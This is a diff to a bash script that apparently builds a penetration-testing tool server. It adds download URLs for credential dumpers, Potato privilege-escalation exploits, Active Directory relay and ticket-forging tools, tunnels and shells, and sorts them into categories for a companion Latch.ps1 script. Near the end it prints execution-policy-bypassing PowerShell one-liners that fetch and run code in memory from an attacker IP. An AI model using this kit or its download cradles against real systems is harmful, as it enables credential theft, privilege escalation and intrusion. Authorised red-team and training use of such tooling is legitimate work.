@@ -81,18 +81,33 @@ TOOLS["winPEAS.bat"]="winpeas.bat|https://github.com/peass-ng/PEASS-ng/releases/
 TOOLS["linpeas.sh"]="linpeas.sh|https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh|none|LinPEAS"
 TOOLS["linpeas_linux_amd64"]="linpeas_linux_amd64|https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64|none|LinPEAS"
 
+# --- Linux Enumeration Scripts ---
+TOOLS["LinEnum.sh"]="linenum.sh|https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh|none|LinEnum"
+TOOLS["lse.sh"]="lse.sh linux-smart-enumeration.sh|https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh|none|LSE"
+TOOLS["linux-exploit-suggester.sh"]="linux-exploit-suggester.sh les.sh|https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh|none|LES"
+
 # --- LaZagne ---
 TOOLS["lazagne.exe"]="lazagne.exe|https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe|none|LaZagne"
 
-# --- Potato Attacks ---
+# --- Print Spooler Abuse ---
 TOOLS["PrintSpoofer64.exe"]="printspoofer64.exe printspoofer.exe|https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe|none|PrintSpoofer"
 TOOLS["PrintSpoofer32.exe"]="printspoofer32.exe|https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe|none|PrintSpoofer"
+
+# --- Potato Attacks (COM Server / Token Impersonation) ---
 TOOLS["GodPotato-NET4.exe"]="godpotato-net4.exe godpotato.exe|https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe|none|GodPotato"
 TOOLS["GodPotato-NET35.exe"]="godpotato-net35.exe|https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET35.exe|none|GodPotato"
 TOOLS["GodPotato-NET2.exe"]="godpotato-net2.exe|https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET2.exe|none|GodPotato"
 TOOLS["JuicyPotato.exe"]="juicypotato.exe juicypotato64.exe|https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe|none|JuicyPotato"
 TOOLS["JuicyPotatoNG.exe"]="juicypotatong.exe|https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip|unzip_find:JuicyPotatoNG.exe|JuicyPotato"
 TOOLS["SweetPotato.exe"]="sweetpotato.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SweetPotato.exe|none|SweetPotato"
+TOOLS["RoguePotato.exe"]="roguepotato.exe|https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip|unzip_find:RoguePotato.exe|RoguePotato"
+TOOLS["LocalPotato.exe"]="localpotato.exe|https://github.com/decoder-it/LocalPotato/releases/download/v0.2/LocalPotato.exe|none|LocalPotato"
+TOOLS["RemotePotato0.exe"]="remotepotato0.exe|https://github.com/antonioCoco/RemotePotato0/releases/download/1.2/RemotePotato0.zip|unzip_find:RemotePotato0.exe|RemotePotato0"
+TOOLS["CoercedPotato.exe"]="coercedpotato.exe|https://github.com/Prepouce/CoercedPotato/releases/download/v1.0.1/CoercedPotato.exe|none|CoercedPotato"
+TOOLS["GenericPotato.exe"]="genericpotato.exe|https://github.com/micahvandeusen/GenericPotato/releases/download/1.0.2/GenericPotato.exe|none|GenericPotato"
+
+# --- EFS Potato ---
+TOOLS["SharpEfsPotato.exe"]="sharpefspotato.exe efspotato.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpEfsPotato.exe|none|SharpEfsPotato"
 
 # --- GhostPack / SharpCollection (pre-compiled) ---
 TOOLS["SharpUp.exe"]="sharpup.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpUp.exe|none|SharpUp"
@@ -110,11 +125,27 @@ TOOLS["SharpSecDump.exe"]="sharpsecdump.exe|https://github.com/Flangvik/SharpCol
 TOOLS["ADCSPwn.exe"]="adcspwn.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/ADCSPwn.exe|none|ADCSPwn"
 TOOLS["Whisker.exe"]="whisker.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Whisker.exe|none|Whisker"
 TOOLS["KrbRelayUp.exe"]="krbrelayup.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/KrbRelayUp.exe|none|KrbRelayUp"
+TOOLS["SharpWeb.exe"]="sharpweb.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpWeb.exe|none|SharpWeb"
+TOOLS["Farmer.exe"]="farmer.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Farmer.exe|none|Farmer"
+TOOLS["SharpLAPS.exe"]="sharplaps.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpLAPS.exe|none|SharpLAPS"
+TOOLS["SharpGPOAbuse.exe"]="sharpgpoabuse.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpGPOAbuse.exe|none|SharpGPOAbuse"
 
 # --- PowerSploit ---
 TOOLS["PowerUp.ps1"]="powerup.ps1|https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1|none|PowerSploit"
 TOOLS["PowerView.ps1"]="powerview.ps1|https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1|none|PowerSploit"
 TOOLS["Invoke-Mimikatz.ps1"]="invoke-mimikatz.ps1|https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1|none|PowerSploit"
+
+# --- PrivescCheck ---
+TOOLS["PrivescCheck.ps1"]="privesccheck.ps1|https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1|none|PrivescCheck"
+
+# --- Windows Enumeration Scripts ---
+TOOLS["jaws-enum.ps1"]="jaws-enum.ps1 jaws.ps1|https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1|none|JAWS"
+TOOLS["Watson.exe"]="watson.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Watson.exe|none|Watson"
+TOOLS["Sherlock.ps1"]="sherlock.ps1|https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1|none|Sherlock"
+
+# --- RunasCs (Windows sudo) ---
+TOOLS["RunasCs.exe"]="runascs.exe|https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip|unzip_find:RunasCs.exe|RunasCs"
+TOOLS["RunasCs_net2.exe"]="runascs_net2.exe|https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip|unzip_find:RunasCs_net2.exe|RunasCs"
 
 # --- Mimikatz ---
 TOOLS["mimikatz.exe"]="mimikatz.exe|https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip|unzip_find:x64/mimikatz.exe|Mimikatz"
@@ -123,9 +154,15 @@ TOOLS["mimikatz32.exe"]="mimikatz32.exe|https://github.com/gentilkiwi/mimikatz/r
 # --- Snaffler ---
 TOOLS["Snaffler.exe"]="snaffler.exe|https://github.com/SnaffCon/Snaffler/releases/latest/download/Snaffler.exe|none|Snaffler"
 
+# --- ADCS / Coercion Attacks ---
+TOOLS["PetitPotam.exe"]="petitpotam.exe|https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/PetitPotam.exe|none|PetitPotam"
+TOOLS["PetitPotam.py"]="petitpotam.py|https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.py|none|PetitPotam"
+
 # --- SharpHound / BloodHound ---
 TOOLS["SharpHound.exe"]="sharphound.exe|https://github.com/SpecterOps/SharpHound/releases/download/v2.5.9/SharpHound-v2.5.9.zip|unzip_find:SharpHound.exe|SharpHound"
 TOOLS["SharpHound.ps1"]="sharphound.ps1|https://github.com/SpecterOps/SharpHound/releases/download/v2.5.9/SharpHound-v2.5.9.zip|unzip_find:SharpHound.ps1|SharpHound"
+TOOLS["RustHound.exe"]="rusthound.exe|https://github.com/NH-RED-TEAM/RustHound/releases/latest/download/rusthound_x86_64.exe|none|RustHound"
+TOOLS["rusthound_linux"]="rusthound|https://github.com/NH-RED-TEAM/RustHound/releases/latest/download/rusthound_musl|none|RustHound"
 
 # --- Sysinternals ---
 TOOLS["accesschk.exe"]="accesschk.exe accesschk64.exe|https://download.sysinternals.com/files/AccessChk.zip|unzip_find:accesschk64.exe|Sysinternals"
@@ -153,6 +190,7 @@ TOOLS["nc32.exe"]="nc32.exe|https://github.com/int0x33/nc.exe/raw/master/nc.exe|
 
 # --- Socat ---
 TOOLS["socat"]="socat|https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat|none|Socat"
+TOOLS["socat.exe"]="socat.exe|https://github.com/tech128/socat-1.7.3.0-windows/raw/master/socat-1.7.3.0/socat.exe|none|Socat"
 
 # --- Ligolo-ng ---
 TOOLS["ligolo-agent.exe"]="ligolo-agent.exe agent.exe|https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_windows_amd64.zip|unzip_find:agent.exe|Ligolo"
@@ -168,10 +206,19 @@ TOOLS["php-reverse-shell.php"]="php-reverse-shell.php|https://raw.githubusercont
 
 # --- Impacket scripts ---
 TOOLS["GetUserSPNs.py"]="getuserspns.py|https://raw.githubusercontent.com/fortra/impacket/master/examples/GetUserSPNs.py|none|Impacket"
+TOOLS["GetNPUsers.py"]="getnpusers.py|https://raw.githubusercontent.com/fortra/impacket/master/examples/GetNPUsers.py|none|Impacket"
 TOOLS["secretsdump.py"]="secretsdump.py|https://raw.githubusercontent.com/fortra/impacket/master/examples/secretsdump.py|none|Impacket"
 TOOLS["psexec.py"]="psexec.py|https://raw.githubusercontent.com/fortra/impacket/master/examples/psexec.py|none|Impacket"
 TOOLS["wmiexec.py"]="wmiexec.py|https://raw.githubusercontent.com/fortra/impacket/master/examples/wmiexec.py|none|Impacket"
 TOOLS["smbexec.py"]="smbexec.py|https://raw.githubusercontent.com/fortra/impacket/master/examples/smbexec.py|none|Impacket"
+TOOLS["atexec.py"]="atexec.py|https://raw.githubusercontent.com/fortra/impacket/master/examples/atexec.py|none|Impacket"
+TOOLS["dcomexec.py"]="dcomexec.py|https://raw.githubusercontent.com/fortra/impacket/master/examples/dcomexec.py|none|Impacket"
+TOOLS["getTGT.py"]="gettgt.py|https://raw.githubusercontent.com/fortra/impacket/master/examples/getTGT.py|none|Impacket"
+TOOLS["getST.py"]="getst.py|https://raw.githubusercontent.com/fortra/impacket/master/examples/getST.py|none|Impacket"
+TOOLS["ticketer.py"]="ticketer.py|https://raw.githubusercontent.com/fortra/impacket/master/examples/ticketer.py|none|Impacket"
+TOOLS["ntlmrelayx.py"]="ntlmrelayx.py|https://raw.githubusercontent.com/fortra/impacket/master/examples/ntlmrelayx.py|none|Impacket"
+TOOLS["addcomputer.py"]="addcomputer.py|https://raw.githubusercontent.com/fortra/impacket/master/examples/addcomputer.py|none|Impacket"
+TOOLS["rbcd.py"]="rbcd.py|https://raw.githubusercontent.com/fortra/impacket/master/examples/rbcd.py|none|Impacket"
 
 # ============================================================================
 # FUNCTIONS
@@ -441,12 +488,53 @@ done
 echo -e "${GREEN}[+] Created flat 'all/' folder with $tool_count tool symlinks${NC}"
 echo ""
 
+# =============================================================================
+# CREATE CATEGORY FOLDERS
+# Categories group tools by purpose for selective downloads from Latch.ps1
+# =============================================================================
+
+# Define which tool folders belong to which category
+declare -A CATEGORIES
+CATEGORIES["Enumeration"]="WinPEAS LinPEAS SharpUp Seatbelt PowerSploit PrivescCheck JAWS Watson Sherlock LinEnum LSE LES pspy Sysinternals"
+CATEGORIES["Credentials"]="LaZagne Mimikatz SharpDPAPI SharpChrome SharpWeb Rubeus SafetyKatz SharpKatz SharpSecDump Snaffler SharpRoast LockLess"
+CATEGORIES["TokenAbuse"]="PrintSpoofer GodPotato JuicyPotato SweetPotato RoguePotato LocalPotato RemotePotato0 CoercedPotato GenericPotato SharpEfsPotato"
+CATEGORIES["AD"]="SharpHound RustHound Certify Whisker KrbRelayUp ADCSPwn PetitPotam SharpLAPS SharpGPOAbuse Kerbrute Farmer PowerSploit"
+CATEGORIES["Tunneling"]="Chisel Ligolo Socat Netcat"
+CATEGORIES["Impacket"]="Impacket"
+CATEGORIES["Shells"]="Nishang WebShells Netcat"
+
+# Create category folders with symlinks
+echo -e "${YELLOW}[*] Creating category folders...${NC}"
+for category in "${!CATEGORIES[@]}"; do
+    CAT_DIR="$SERVE_DIR/categories/$category"
+    mkdir -p "$CAT_DIR"
+    rm -f "$CAT_DIR"/* 2>/dev/null
+
+    cat_count=0
+    for tool_folder in ${CATEGORIES[$category]}; do
+        folder_path="$SERVE_DIR/$tool_folder"
+        [[ -d "$folder_path" ]] || continue
+
+        for tool in "$folder_path"/*; do
+            [[ -f "$tool" || -L "$tool" ]] || continue
+            tool_name=$(basename "$tool")
+            ln -sf "../../$tool_folder/$tool_name" "$CAT_DIR/$tool_name" 2>/dev/null
+            cat_count=$((cat_count + 1))
+        done
+    done
+
+    if [[ $cat_count -gt 0 ]]; then
+        echo -e "  ${GREEN}[+] categories/$category/${NC} ($cat_count tools)"
+    fi
+done
+echo ""
+
 # List available tools by folder
 echo -e "${YELLOW}[*] Tools organized in $SERVE_DIR:${NC}"
 for folder in "$SERVE_DIR"/*/; do
     [[ -d "$folder" ]] || continue
     folder_name=$(basename "$folder")
-    [[ "$folder_name" == ".downloads" || "$folder_name" == "all" ]] && continue
+    [[ "$folder_name" == ".downloads" || "$folder_name" == "all" || "$folder_name" == "categories" ]] && continue
     file_count=$(find "$folder" -maxdepth 1 \( -type f -o -type l \) 2>/dev/null | wc -l)
     [[ "$file_count" -eq 0 ]] && continue
     echo -e "  ${CYAN}$folder_name/${NC} ($file_count)"
@@ -517,8 +605,12 @@ echo ""
 echo -e "  ${MAGENTA}# Run Latch.ps1 in memory (no disk write)${NC}"
 echo -e "  powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://$DEFAULT_IP/Latch.ps1')\""
 echo ""
-echo -e "  ${MAGENTA}# Download Latch.ps1 and run with tool downloads${NC}"
-echo -e "  powershell -ep bypass -c \".\\s.ps1 -RemoteHost $DEFAULT_IP -DownloadTools\""
+echo -e "  ${MAGENTA}# Download Latch.ps1 and run with category-based tool downloads${NC}"
+echo -e "  powershell -ep bypass -c \".\\s.ps1 -RemoteHost $DEFAULT_IP -DownloadTools Enumeration\""
+echo -e "  powershell -ep bypass -c \".\\s.ps1 -RemoteHost $DEFAULT_IP -DownloadTools TokenAbuse\""
+echo -e "  powershell -ep bypass -c \".\\s.ps1 -RemoteHost $DEFAULT_IP -DownloadTools All\""
+echo ""
+echo -e "  ${MAGENTA}# Categories: Enumeration, Credentials, TokenAbuse, AD, Tunneling, Impacket, Shells, All${NC}"
 echo ""
 echo -e "  ${MAGENTA}# Download single tool (use /all/ for flat paths)${NC}"
 echo -e "  powershell -c \"(New-Object Net.WebClient).DownloadFile('http://$DEFAULT_IP/all/winPEASx64.exe','w.exe')\""
